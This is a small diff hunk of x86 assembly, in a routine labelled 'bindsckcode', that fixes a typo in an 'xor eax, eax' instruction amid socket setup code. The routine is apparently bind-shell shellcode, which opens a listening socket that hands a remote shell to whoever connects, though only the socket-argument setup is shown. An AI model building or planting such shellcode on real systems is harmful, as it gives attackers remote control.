@@ -41,7 +41,7 @@ bindsckcode:
    inc     eax
    inc     eax 
    push    ax
-   xor     eax, ea
+   xor     eax, eax
    mov     edi,esp      ;sockaddr_in*
    push    eax          ;protocol
    push    byte SOCK_STREAM   ;type
